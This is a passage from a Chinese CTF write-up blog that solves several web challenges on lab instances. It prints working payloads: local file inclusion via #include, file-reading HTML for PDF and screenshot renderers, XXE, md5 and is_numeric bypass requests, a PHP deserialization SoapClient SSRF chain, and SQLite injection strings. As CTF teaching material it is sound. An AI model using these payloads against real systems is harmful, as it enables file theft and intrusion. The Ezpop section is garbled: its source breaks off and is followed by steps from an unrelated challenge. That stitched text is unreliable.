<h2 id="b01lers2020-Scrambled"><a href="#b01lers2020-Scrambled" class="headerlink" title="[b01lers2020]Scrambled"></a>[b01lers2020]Scrambled</h2><p><strong>脑洞题</strong></p>
<p>源码没什么东西，只有 Cookie 有点东西</p>
<p><code>frequency</code> 是访问次数</p>
<p><code>transmissions</code>只有中间四位不断变化，有斜杠，有大括号，猜测前两位应该是 flag，后两位是 flag 所在的位置</p>
<p>直接上脚本</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import requests as rq</span><br><span class="line">import re, urllib</span><br><span class="line"></span><br><span class="line">flag = [&#x27;_&#x27;] * 42</span><br><span class="line">url = &quot;http://7f46b512-f523-4788-8e86-e6c8b3deb002.node3.buuoj.cn/&quot;</span><br><span class="line">cookies = &#123;&quot;frequency&quot;:&quot;1&quot;,&quot;transmissions&quot;:&quot;x&quot;&#125;</span><br><span class="line"></span><br><span class="line">while True:</span><br><span class="line">    res = rq.get(url, cookies=cookies)</span><br><span class="line">    cookie = res.headers[&quot;Set-Cookie&quot;].split(&#x27;;&#x27;)[3].split(&#x27;=&#x27;)[2].replace(&quot;kxkxkxkxsh&quot;,&quot;&quot;)</span><br><span class="line">    cookie = urllib.parse.unquote(cookie)</span><br><span class="line"></span><br><span class="line">    if len(cookie) == 4:</span><br><span class="line">        index = int(cookie[-2:])</span><br><span class="line">    else:</span><br><span class="line">        index = int(cookie[-1])</span><br><span class="line">    flag[index] = cookie[0]</span><br><span class="line">    flag[index + 1] = cookie[1]</span><br><span class="line"></span><br><span class="line">    print(&#x27;&#x27;.join(flag))</span><br><span class="line">    if &#x27;_&#x27; not in flag:</span><br><span class="line">        break</span><br></pre></td></tr></table></figure>



<h2 id="FireshellCTF2020-Caas"><a href="#FireshellCTF2020-Caas" class="headerlink" title="[FireshellCTF2020]Caas"></a>[FireshellCTF2020]Caas</h2><p><strong>文件包含</strong></p>
<p>随意输入一段代码，我们可以知道它是 Linux 下对 c 语言的编译器</p>
<p>包含文件时如果文件不存在会报错，尝试</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include &quot;/etc/passwd&quot;</span><br></pre></td></tr></table></figure>

<p>会爆出部分文件信息，所以这里是文件包含漏洞，直接包含 &#x2F;flag 即可</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include &quot;/flag&quot;</span><br></pre></td></tr></table></figure>



<h2 id="FireshellCTF2020-URL-TO-PDF"><a href="#FireshellCTF2020-URL-TO-PDF" class="headerlink" title="[FireshellCTF2020]URL TO PDF"></a>[FireshellCTF2020]URL TO PDF</h2><p><strong>xss</strong></p>
<p>vps 上创建如下 index.html</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;link rel=&quot;attachment&quot; href=&quot;file:///flag&quot;&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>本地下载 pdf</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl -X POST http://b57370e7-5b4d-4485-a409-ea42090a26c4.node3.buuoj.cn/ -d &quot;url=http://174.1.129.147:9999&quot; --output flag.pdf</span><br></pre></td></tr></table></figure>

<blockquote>
<p>安装 pdfdetach</p>
<p>sudo apt install xpdf</p>
</blockquote>
<p>利用 pdfdetach 分离 pdf</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ pdfdetach -list flag.pdf</span><br><span class="line">1 embedded files</span><br><span class="line">1: flag</span><br><span class="line">$ pdfdetach -save 1 flag.pdf</span><br><span class="line">$ cat flag</span><br><span class="line">flag&#123;c130bcef-78ec-4305-9c1d-645de0affa42&#125;</span><br></pre></td></tr></table></figure>



<h2 id="FireshellCTF2020-ScreenShooter"><a href="#FireshellCTF2020-ScreenShooter" class="headerlink" title="[FireshellCTF2020]ScreenShooter"></a>[FireshellCTF2020]ScreenShooter</h2><p><strong>xss</strong></p>
<p>和 URL TO PDF 很类似</p>
<p>根据 HTTP 查看客户端信息</p>
<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200527111633.png" alt="image-20200524195743552"></p>
<p>发现其用的是 PhantomJS，所以这里是用 js 来读 flag</p>
<p>参考一位日本师傅的 wp</p>
<p><a href="https://st98.github.io/diary/posts/2020-03-23-fireshell-ctf.html">https://st98.github.io/diary/posts/2020-03-23-fireshell-ctf.html</a></p>
<blockquote>
<p>因为 flag 返回的是黑色字符，所以这里要把背景弄成白色才能看到 flag</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!doctype html&gt;</span><br><span class="line">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="line">  &lt;head&gt;</span><br><span class="line">    &lt;title&gt;test&lt;/title&gt;</span><br><span class="line">    &lt;style&gt;body &#123; background: white; &#125;&lt;/style&gt;</span><br><span class="line">  &lt;/head&gt;</span><br><span class="line">  &lt;body&gt;</span><br><span class="line">    &lt;script&gt;</span><br><span class="line">      var xhr = new XMLHttpRequest();</span><br><span class="line">      xhr.onload = function () &#123;</span><br><span class="line">        document.body.innerText = xhr.responseText;</span><br><span class="line">      &#125;;</span><br><span class="line">      xhr.open(&#x27;GET&#x27;, &#x27;file:///flag&#x27;);</span><br><span class="line">      xhr.send();</span><br><span class="line">    &lt;/script&gt;</span><br><span class="line">  &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>



<h2 id="FireshellCTF2020-Cars"><a href="#FireshellCTF2020-Cars" class="headerlink" title="[FireshellCTF2020]Cars"></a>[FireshellCTF2020]Cars</h2><p><strong>XXE</strong></p>
<p>是一个用 Kotlin 写的 APK，我们先来看看它的接口有哪些，刚好对应了三个 Activity</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// apk/app/src/main/java/com/arconsultoria/cars/rest/Rest.kt</span><br><span class="line">interface Rest &#123;</span><br><span class="line"></span><br><span class="line">    @GET(&quot;/cars&quot;)</span><br><span class="line">    fun getCars(): Call&lt;List&lt;Car&gt;&gt;</span><br><span class="line"></span><br><span class="line">    @GET(&quot;/car/&#123;id&#125;&quot;)</span><br><span class="line">    fun getCar(@Path(&quot;id&quot;) id: Int): Call&lt;Car&gt;</span><br><span class="line"></span><br><span class="line">    @POST(&quot;/comment&quot;)</span><br><span class="line">    fun postComment(@Body comment: Comment): Call&lt;CommentResponse&gt;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>/cars</code> 和 <code>/car</code> 接口只能查询信息，下面我们重点看一下 <code>/comment</code> 接口</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// apk/app/src/main/java/com/arconsultoria/cars/activity/CommentActivity.kt</span><br><span class="line">fun send_comment() &#123;</span><br><span class="line">    val retrofit = Retrofit.Builder()</span><br><span class="line">        .baseUrl(resources.getString(R.string.url_api))</span><br><span class="line">        .addConverterFactory(GsonConverterFactory.create())</span><br><span class="line">        .build()</span><br><span class="line"></span><br><span class="line">    val service = retrofit.create(Rest::class.java)</span><br><span class="line">    val comment = Comment(edt_name.text.toString(), edt_message.text.toString())</span><br><span class="line">    val call = service.postComment(comment)</span><br><span class="line">    call.enqueue(object : Callback&lt;CommentResponse&gt; &#123;</span><br><span class="line">        override fun onFailure(call: Call&lt;CommentResponse&gt;, t: Throwable) &#123;</span><br><span class="line">            Toast.makeText(baseContext, &quot;Error posting comment!&quot;, Toast.LENGTH_LONG).show()</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        override fun onResponse(</span><br><span class="line">            call: Call&lt;CommentResponse&gt;,</span><br><span class="line">            response: Response&lt;CommentResponse&gt;</span><br><span class="line">        ) &#123;</span><br><span class="line">            if (response.code() != 200) &#123;</span><br><span class="line">                Toast.makeText(baseContext, &quot;Error posting comment!&quot;, Toast.LENGTH_LONG).show()</span><br><span class="line">                return</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            Toast.makeText(baseContext, response.body()?.message, Toast.LENGTH_LONG).show()</span><br><span class="line">            finish()</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// apk/app/src/main/java/com/arconsultoria/cars/domain/Comment.kt</span><br><span class="line">package com.arconsultoria.cars.domain</span><br><span class="line"></span><br><span class="line">data class Comment(</span><br><span class="line">    var name: String,</span><br><span class="line">    var message: String</span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<p>大致逻辑就是接受一个 name 和 message，利用 retrofit 调用 Rest 的接口进行 HTTP 应答，然后再显示一个成功信息</p>
<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200527111627.png" alt="image-20200525205600302"></p>
<p>可以看到我们的名字得到了回显，所以我们可以猜想一个有没有可能有 xxe，发现可以成功回显</p>
<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200527111624.png" alt="image-20200525210033943"></p>
<p>然后直接读 &#x2F;flag 就好</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; </span><br><span class="line">&lt;!DOCTYPE foo [  </span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;file:///flag&quot;&gt; ]&gt; </span><br><span class="line">&lt;Comment&gt;</span><br><span class="line">    &lt;name&gt;&amp;xxe;&lt;/name&gt;</span><br><span class="line">    &lt;message&gt;hello&lt;/message&gt;</span><br><span class="line">&lt;/Comment&gt;</span><br></pre></td></tr></table></figure>



<h2 id="MRCTF2020-Ezpop"><a href="#MRCTF2020-Ezpop" class="headerlink" title="[MRCTF2020]Ezpop"></a>[MRCTF2020]Ezpop</h2><p><strong>反序列化</strong></p>
<p>进去后得到源码，需要我们构造反序列化pop链</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="linespan><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure>

<p>IP 伪造要一个个试</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Client-Ip: 127.0.0.1</span><br></pre></td></tr></table></figure>

<p>file_get_content 用 php:&#x2F;&#x2F;input 绕过</p>
<p>file 写个加密脚本就好</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">function encode($re)&#123;</span><br><span class="line">    $c = &#x27;&#x27;;</span><br><span class="line">    for($i=0;$i&lt;strlen($re);$i++)&#123; </span><br><span class="line">        $c .= chr ( ord ($re[$i]) - $i*2 ); </span><br><span class="line">    &#125; </span><br><span class="line">    $v = base64_encode($c); </span><br><span class="line">    return $v;</span><br><span class="line">&#125;</span><br><span class="line">echo encode(&#x27;flag.php&#x27;);</span><br><span class="line"></span><br><span class="line"># ZmpdYSZmXGI=</span><br></pre></td></tr></table></figure>

<p>最终 payload</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET /secrettw.php?2333=php://input&amp;file=ZmpdYSZmXGI%3d HTTP/1.1</span><br><span class="line">Host: 54df68eb-d79a-4927-ad56-ad94e5470714.node3.buuoj.cn</span><br><span class="line">Client-Ip: 127.0.0.1</span><br><span class="line">Content-Length: 20</span><br><span class="line"></span><br><span class="line">todat is a happy day</span><br></pre></td></tr></table></figure>



<h2 id="MRCTF2020-Ez-bypass"><a href="#MRCTF2020-Ez-bypass" class="headerlink" title="[MRCTF2020]Ez_bypass"></a>[MRCTF2020]Ez_bypass</h2><p><strong>代码审计</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">I put something in F12 for you</span><br><span class="line">include &#x27;flag.php&#x27;;</span><br><span class="line">$flag=&#x27;MRCTF&#123;xxxxxxxxxxxxxxxxxxxxxxxxx&#125;&#x27;;</span><br><span class="line">if(isset($_GET[&#x27;gg&#x27;])&amp;&amp;isset($_GET[&#x27;id&#x27;])) &#123;</span><br><span class="line">    $id=$_GET[&#x27;id&#x27;];</span><br><span class="line">    $gg=$_GET[&#x27;gg&#x27;];</span><br><span class="line">    if (md5($id) === md5($gg) &amp;&amp; $id !== $gg) &#123;</span><br><span class="line">        echo &#x27;You got the first step&#x27;;</span><br><span class="line">        if(isset($_POST[&#x27;passwd&#x27;])) &#123;</span><br><span class="line">            $passwd=$_POST[&#x27;passwd&#x27;];</span><br><span class="line">            if (!is_numeric($passwd))</span><br><span class="line">            &#123;</span><br><span class="line">                 if($passwd==1234567)</span><br><span class="line">                 &#123;</span><br><span class="line">                     echo &#x27;Good Job!&#x27;;</span><br><span class="line">                     highlight_file(&#x27;flag.php&#x27;);</span><br><span class="line">                     die(&#x27;By Retr_0&#x27;);</span><br><span class="line">                 &#125;</span><br><span class="line">                 else</span><br><span class="line">                 &#123;</span><br><span class="line">                     echo &quot;can you think twice??&quot;;</span><br><span class="line">                 &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            else&#123;</span><br><span class="line">                echo &#x27;You can not get it !&#x27;;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        else&#123;</span><br><span class="line">            die(&#x27;only one way to get the flag&#x27;);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">    else &#123;</span><br><span class="line">        echo &quot;You are not a real hacker!&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    die(&#x27;Please input first&#x27;);</span><br><span class="line">&#125;</span><br><span class="line">&#125;Please input first</span><br></pre></td></tr></table></figure>

<p>数据绕 md5 ，数字加字母绕过 is_numeric</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /?gg[]=1&amp;id[]=2 HTTP/1.1</span><br><span class="line">Host: 3b3bfe4c-e6a9-4d8e-a886-7b741a51276a.node3.buuoj.cn</span><br><span class="line">Content-Length: 15</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">passwd=1234567a</span><br></pre></td></tr></table></figure>



<h2 id="MRCTF2020-Ezpop-Revenge"><a href="#MRCTF2020-Ezpop-Revenge" class="headerlink" title="[MRCTF2020]Ezpop_Revenge"></a>[MRCTF2020]Ezpop_Revenge</h2><p><strong>SoapClient ssrf</strong></p>
<p><a href="http://www.zip/">www.zip</a> 源码泄露</p>
<p>查看 flag.php，需要 ssrf</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    if(!isset($_SESSION)) session_start();</span><br><span class="line">    if($_SERVER[&#x27;REMOTE_ADDR&#x27;]===&quot;127.0.0.1&quot;)&#123;</span><br><span class="line">       $_SESSION[&#x27;flag&#x27;]= &quot;MRCTF&#123;******&#125;&quot;;</span><br><span class="line">    &#125;else echo &quot;我扌your problem?\nonly localhost can get flag!&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>查看 Plugin.php，可以看到存在反序列化操作</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public function action()&#123;</span><br><span class="line">    if(!isset($_SESSION)) session_start();</span><br><span class="line">    if(isset($_REQUEST[&#x27;admin&#x27;])) var_dump($_SESSION);</span><br><span class="line">    if (isset($_POST[&#x27;C0incid3nc3&#x27;])) &#123;</span><br><span class="line">        if(preg_match(&quot;/file|assert|eval|[`\&#x27;~^?&lt;&gt;$%]+/i&quot;,base64_decode($_POST[&#x27;C0incid3nc3&#x27;])) === 0)</span><br><span class="line">            unserialize(base64_decode($_POST[&#x27;C0incid3nc3&#x27;]));</span><br><span class="line">        else &#123;</span><br><span class="line">            echo &quot;Not that easy.&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>激活的方法在 &#x2F;page_admin</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public static function activate($pluginName)</span><br><span class="line">&#123;</span><br><span class="line">    self::$_plugins[&#x27;activated&#x27;][$pluginName] = self::$_tmp;</span><br><span class="line">    self::$_tmp = array();</span><br><span class="line">    Helper::addRoute(&quot;page_admin_action&quot;,&quot;/page_admin&quot;,&quot;HelloWorld_Plugin&quot;,&#x27;action&#x27;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们跟进这个奇怪的 class</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">class HelloWorld_DB&#123;</span><br><span class="line">    private $flag=&quot;MRCTF&#123;this_is_a_fake_flag&#125;&quot;;</span><br><span class="line">    private $coincidence;</span><br><span class="line">    function  __wakeup()&#123;</span><br><span class="line">        $db = new Typecho_Db($this-&gt;coincidence[&#x27;hello&#x27;], $this-&gt;coincidence[&#x27;world&#x27;]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>转到 &#x2F;var&#x2F;Typecho&#x2F;Db.php，看到 $adapterName 进行了拼接</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public function __construct($adapterName, $prefix = &#x27;typecho_&#x27;)</span><br><span class="line">&#123;</span><br><span class="line">    /** 获取适配器名称 */</span><br><span class="line">    $this-&gt;_adapterName = $adapterName;</span><br><span class="line"></span><br><span class="line">    /** 数据库适配器 */</span><br><span class="line">    $adapterName = &#x27;Typecho_Db_Adapter_&#x27; . $adapterName;</span><br><span class="line"></span><br><span class="line">    if (!call_user_func(array($adapterName, &#x27;isAvailable&#x27;))) &#123;</span><br><span class="line">        throw new Typecho_Db_Exception(&quot;Adapter &#123;$adapterName&#125; is not available&quot;);//__toString()</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $this-&gt;_prefix = $prefix;</span><br><span class="line"></span><br><span class="line">    /** 初始化内部变量 */</span><br><span class="line">    $this-&gt;_pool = array();</span><br><span class="line">    $this-&gt;_connectedPool = array();</span><br><span class="line">    $this-&gt;_config = array();</span><br><span class="line"></span><br><span class="line">    //实例化适配器对象</span><br><span class="line">    $this-&gt;_adapter = new $adapterName();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>搜索 __string() 方法，跳转到 &#x2F;var&#x2F;Tpecho&#x2F;Db&#x2F;Query.php</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public function __toString()</span><br><span class="line">&#123;</span><br><span class="line">    switch ($this-&gt;_sqlPreBuild[&#x27;action&#x27;]) &#123;</span><br><span class="line">        case Typecho_Db::SELECT:</span><br><span class="line">            return $this-&gt;_adapter-&gt;parseSelect($this-&gt;_sqlPreBuild);</span><br><span class="line">        case Typecho_Db::INSERT:</span><br><span class="line">            return &#x27;INSERT INTO &#x27;</span><br><span class="line">            . $this-&gt;_sqlPreBuild[&#x27;table&#x27;]</span><br><span class="line">            . &#x27;(&#x27; . implode(&#x27; , &#x27;, array_keys($this-&gt;_sqlPreBuild[&#x27;rows&#x27;])) . &#x27;)&#x27;</span><br><span class="line">            . &#x27; VALUES &#x27;</span><br><span class="line">            . &#x27;(&#x27; . implode(&#x27; , &#x27;, array_values($this-&gt;_sqlPreBuild[&#x27;rows&#x27;])) . &#x27;)&#x27;</span><br><span class="line">            . $this-&gt;_sqlPreBuild[&#x27;limit&#x27;];</span><br><span class="line">        case Typecho_Db::DELETE:</span><br><span class="line">            return &#x27;DELETE FROM &#x27;</span><br><span class="line">            . $this-&gt;_sqlPreBuild[&#x27;table&#x27;]</span><br><span class="line">            . $this-&gt;_sqlPreBuild[&#x27;where&#x27;];</span><br><span class="line">        case Typecho_Db::UPDATE:</span><br><span class="line">            $columns = array();</span><br><span class="line">            if (isset($this-&gt;_sqlPreBuild[&#x27;rows&#x27;])) &#123;</span><br><span class="line">                foreach ($this-&gt;_sqlPreBuild[&#x27;rows&#x27;] as $key =&gt; $val) &#123;</span><br><span class="line">                    $columns[] = &quot;$key = $val&quot;;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            return &#x27;UPDATE &#x27;</span><br><span class="line">            . $this-&gt;_sqlPreBuild[&#x27;table&#x27;]</span><br><span class="line">            . &#x27; SET &#x27; . implode(&#x27; , &#x27;, $columns)</span><br><span class="line">            . $this-&gt;_sqlPreBuild[&#x27;where&#x27;];</span><br><span class="line">        default:</span><br><span class="line">            return NULL;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>看到当 action 为 SELECT 时，会调用 <code>$this-&gt;_adapter-&gt;parseSelect($this-&gt;_sqlPreBuild);</code>，如果 $this-&gt;<code>_adapter</code> 没有 <code>parseSelect</code> 方法，就会触发 <code>__call()</code> 函数，这里就满足了 SoapClient 反序列化的条件</p>
<p>所以这里的 POP 链就是</p>
<ol>
<li>反序列化 <code>HelloWorld_DB</code> 类触发 __wakeup() 方法</li>
<li>让 <code>Typecho_Db_Query</code> 赋值给  <code>coincidence[&#39;hello&#39;]</code>，让其触发 <code>__toString()</code> 方法</li>
<li>让 <code>SELECT</code> 赋值给 <code>_sqlPreBuild[&#39;action&#39;]</code>，让其触发 <code>$this-&gt;_adapter-&gt;parseSelect($this-&gt;_sqlPreBuild)</code></li>
<li>让 <code>SoapCient</code> 类赋值给 <code>$this-&gt;_adapter</code>，让其触发 <code>__call()</code> 方法</li>
</ol>
<p>但是这里会有个坑，就是私有变量的 %00 是打不通的，我们可以选择用十六进制 \00 绕过，并且把字符串 s 标识符变成 S，这里参考颖奇师傅的 payload</p>
<p><a href="https://www.gem-love.com/ctf/2184.html#Ezpop_Revenge">https://www.gem-love.com/ctf/2184.html#Ezpop_Revenge</a></p>
<p>所以最终 payload 是</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">class Typecho_Db_Query</span><br><span class="line">&#123;</span><br><span class="line">    private $_sqlPreBuild;</span><br><span class="line">    private $_adapter;</span><br><span class="line"></span><br><span class="line">    public function __construct() &#123;</span><br><span class="line">        $this-&gt;_sqlPreBuild = array(&#x27;action&#x27; =&gt; &#x27;SELECT&#x27;);</span><br><span class="line"></span><br><span class="line">        $url = &quot;http://127.0.0.1/flag.php&quot;;</span><br><span class="line">        $headers = array(</span><br><span class="line">            &#x27;X-Forwarded-For: 127.0.0.1&#x27;,</span><br><span class="line">            &#x27;Cookie: PHPSESSID=2ao5l5vohokfb6kooqkibfhnv1&#x27;</span><br><span class="line">        );  </span><br><span class="line">        $this-&gt;_adapter = new SoapClient(null, array(&#x27;uri&#x27; =&gt; &#x27;hello&#x27;, &#x27;location&#x27; =&gt; $url, &#x27;user_agent&#x27; =&gt; </span><br><span class="line">            &#x27;kk^^&#x27;.join(&#x27;^^&#x27;, $headers)));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class HelloWorld_DB&#123;</span><br><span class="line">    private $coincidence;</span><br><span class="line"></span><br><span class="line">    public function __construct() &#123;</span><br><span class="line">        $this-&gt;coincidence = array(&#x27;hello&#x27; =&gt; new Typecho_Db_Query());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function decorate($str)</span><br><span class="line">&#123;</span><br><span class="line">    $arr = explode(&#x27;:&#x27;, $str);</span><br><span class="line">    $newstr = &#x27;&#x27;;</span><br><span class="line">    for ($i = 0; $i &lt; count($arr); $i++) &#123;</span><br><span class="line">        if (preg_match(&#x27;/00/&#x27;, $arr[$i])) &#123;</span><br><span class="line">            $arr[$i-2] = preg_replace(&#x27;/s/&#x27;, &quot;S&quot;, $arr[$i-2]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    $i = 0;</span><br><span class="line">    for (; $i &lt; count($arr) - 1; $i++) &#123;</span><br><span class="line">        $newstr .= $arr[$i];</span><br><span class="line">        $newstr .= &quot;:&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    $newstr .= $arr[$i];</span><br><span class="line">    return $newstr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$xx = serialize(new HelloWorld_DB());</span><br><span class="line">$xx = preg_replace(&quot;/\^\^/&quot;, &quot;\r\n&quot;, $xx);</span><br><span class="line">$xx = urlencode($xx);</span><br><span class="line">$xx = preg_replace(&#x27;/%00/&#x27;, &#x27;%5c%30%30&#x27;, $xx);</span><br><span class="line">$xx = decorate(urldecode($xx));</span><br><span class="line">var_dump($xx);</span><br><span class="line">$xxx = base64_encode($xx);</span><br><span class="line">echo $xxx;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>带上 PHPSESSID 和 admin 参数就可以看到 flag 了</p>
<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200527111601.png" alt="image-20200523172231392"></p>
<h2 id="Zer0pts2020-phpNantokaAdmin"><a href="#Zer0pts2020-phpNantokaAdmin" class="headerlink" title="[Zer0pts2020]phpNantokaAdmin"></a>[Zer0pts2020]phpNantokaAdmin</h2><p><strong>Sqlite 注入</strong></p>
<p>根据提示这是一个 Sqlite 数据库，相应的操作有创建表、插入值和删除表，那么有可能存在注入的是创建表和插入值，但是插入值那里似乎注不了，所以注入点应该在创建表那里</p>
<p>首先我们需要知道 Sqlite 的一些特性</p>
<p>当 Sqlite 进行 select 时，可以用<code>[]</code>、<code>&#39;</code>、<code>&quot;</code> 和 &#96; 来装饰列名，位于列名后面的字段被称为别名，如</p>
<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200527111558.png" alt="image-20200523180454324"></p>
<p>create table 时支持一种 as 的语法</p>
<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200527111555.png" alt="image-20200523180711650"></p>
<p>参数处有 32 长度的字符限制，所以我们不能进行常规的查表查字段，不过我们直接直接查询当前表的 sql 语句，还有过滤了一些标点符号，其中过滤了注释符 <code>--</code> ，可以用 <code>;</code> 进行闭合</p>
<p>查询当前表的数据操作</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">table_name=kk as select [sql][&amp;columns[0][name]=1&amp;columns[0][type]=]from sqlite_master;</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200527111551.png" alt="image-20200523182143870"></p>
<p>直接查值就好</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">table_name=kk as select [flag_2a2d04c3][&amp;columns[0][name]=1&amp;columns[0][type]=1]from flag_bf1811da;</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200527111548.png" alt="image-20200523182310654">&#96;&#96;</p>
<h2 id="Zer0pts2020-musicblog"><a href="#Zer0pts2020-musicblog" class="headerlink" title="[Zer0pts2020]musicblog"></a>[Zer0pts2020]musicblog</h2><p><strong>xss</strong></p>
<p>首先搜一下 flag 在哪里</p>
<p>可以看到 admin 会对我们的文章进行点赞，所以我们可以尝试在文章中嵌入 <code>#like</code> 标签</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># /worker/worker.js</span><br><span class="line">const crawl = async (url) =&gt; &#123;</span><br><span class="line">    console.log(`[+] Query! ($&#123;url&#125;)`);</span><br><span class="line">    const page = await browser.newPage();</span><br><span class="line">    try &#123;</span><br><span class="line">        await page.setUserAgent(flag);</span><br><span class="line">        await page.goto(url, &#123;</span><br><span class="line">            waitUntil: &#x27;networkidle0&#x27;,</span><br><span class="line">            timeout: 10 * 1000,</span><br><span class="line">        &#125;);</span><br><span class="line">        await page.click(&#x27;#like&#x27;);</span><br><span class="line">    &#125; catch (err)&#123;</span><br><span class="line">        console.log(err);</span><br><span class="line">    &#125;</span><br><span class="line">    await page.close();</span><br><span class="line">    console.log(`[+] Done! ($&#123;url&#125;)`)</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>在文章渲染的地方它用到了 <code>render_tags</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># web/www/post.php</span><br><span class="line">&lt;div class=&quot;mt-3&quot;&gt;</span><br><span class="line">    &lt;?= render_tags($post[&#x27;content&#x27;]) ?&gt;</span><br><span class="line">&lt;/div&gt;</span><br></pre></td></tr></table></figure>

<p>跟进一下这个函数做了什么，就是只留下 <code>&lt;audio&gt;</code> 标签</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># web/www/util.php</span><br><span class="line">function render_tags($str) &#123;</span><br><span class="line">  $str = preg_replace(&#x27;/\[\[(.+?)\]\]/&#x27;, &#x27;&lt;audio controls src=&quot;\\1&quot;&gt;&lt;/audio&gt;&#x27;, $str);</span><br><span class="line">  $str = strip_tags($str, &#x27;&lt;audio&gt;&#x27;); // only allows `&lt;audio&gt;`</span><br><span class="line">  return $str;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>但是 <code>strip_tags</code> 这个函数是存在漏洞的，参考 </p>
<p><a href="https://blog.spoock.com/2018/03/19/wrong-usage-of-filter-function/">https://blog.spoock.com/2018/03/19/wrong-usage-of-filter-function/</a></p>
<p>所以我们可以利用漏洞构造一个 <code>&lt;a&gt;</code> 标签</p>
